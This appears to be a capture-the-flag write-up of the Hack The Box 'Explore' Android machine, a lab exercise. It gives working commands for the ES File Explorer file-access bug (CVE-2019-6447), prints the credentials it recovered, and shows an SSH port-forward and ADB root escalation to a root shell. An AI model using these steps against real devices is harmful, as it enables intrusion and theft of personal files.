---
layout: post
title: HTB Explore Writeup  
subtitle: Easy Box
cover-img: /assets/img/explore.png.png
thumbnail-img: /assets/img/explore.png.png
tags: [HTB]
---

# Notes
![Explore](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/explore.png.png)
IP:10.10.10.247

## Port Scan
```
PORT      STATE    SERVICE                                                                                            
2222/tcp  open     EtherNetIP-1                                                                                       
5555/tcp  filtered freeciv                                                                                            
39773/tcp open     unknown                                                                                            
42135/tcp open     unknown                                                                                            
59777/tcp open     unknown 

```
## Port 2222
SSH-2.0-SSH Server - Banana Studio 

## Port 5555
This port is being used by Android Debug Bridge (adb) and is filtered

## Port 59777
A quick google search showed that port 59777 is used by ES File Explorer. ES File Explorer is a file manager/explorer for android devices. It looks like there is a CVE for ES File Explorer CVE:2019-6447, I used a poc script I found on github https://github.com/fs0c131y/ESFileExplorerOpenPortVuln. This script lets me list and download files off the device.

There was a great write up of this bug https://medium.com/@knownsec404team/analysis-of-es-file-explorer-security-vulnerability-cve-2019-6447-7f34407ed566 

Using the tool I was able to find a file called "creds.jpg"

```
┌──(root💀kali)-[~/htb/explore]
└─# python3 poc.py --cmd listPics --ip 10.10.10.247 
[*] Executing command: listPics on 10.10.10.247
[*] Server responded with: 200

{"name":"concept.jpg", "time":"4/21/21 02:38:08 AM", "location":"/storage/emulated/0/DCIM/concept.jpg", "size":"135.33 KB (138,573 Bytes)", },
{"name":"anc.png", "time":"4/21/21 02:37:50 AM", "location":"/storage/emulated/0/DCIM/anc.png", "size":"6.24 KB (6,392 Bytes)", },
{"name":"creds.jpg", "time":"4/21/21 02:38:18 AM", "location":"/storage/emulated/0/DCIM/creds.jpg", "size":"1.14 MB (1,200,401 Bytes)", },
{"name":"224_anc.png", "time":"4/21/21 02:37:21 AM", "location":"/storage/emulated/0/DCIM/224_anc.png", "size":"124.88 KB (127,876 Bytes)"}

```

I downloaded it

```
┌──(root💀kali)-[~/htb/explore]
└─# python3 poc.py -g /storage/emulated/0/DCIM/creds.jpg --ip 10.10.10.247 
[*] Getting file: /storage/emulated/0/DCIM/creds.jpg
        from: 10.10.10.247
[*] Server responded with: 200
[*] Writing to file: creds.jpg
                               
```

It was a picture of some credentials `kristi:Kr1sT!5h@Rp3xPl0r3!`

## User Shell

I was able to ssh into it by using the credentials found 

```
┌──(root💀kali)-[~/htb]
└─# ssh -p 2222 kristi@10.10.10.247
Password authentication
Password: 
```

Looking inside `/sdcard` I found the user flag

## Root
Back when I did my nmap scan port 5555 was running adb. Now that we have a valid ssh session we can port forward back to kali and access adb

I found the commands for abd here https://adbshell.com/

Port forward
`ssh kristi@10.10.10.247 -p 2222 -L 5555:localhost:5555`

Connect to abd
`adb connect 127.0.0.1:5555`

We can restart the adb service as root
`adb root`

From there adb is running with high privs so we can drop into a shell and su to root
```
──(root💀kali)-[~/htb]
└─# adb shell                                                                                                                                                                                                                            1 ⨯
x86_64:/ $ id
uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:shell:s0
x86_64:/ $ su
:/ # id
uid=0(root) gid=0(root) groups=0(root) context=u:r:su:s0

```
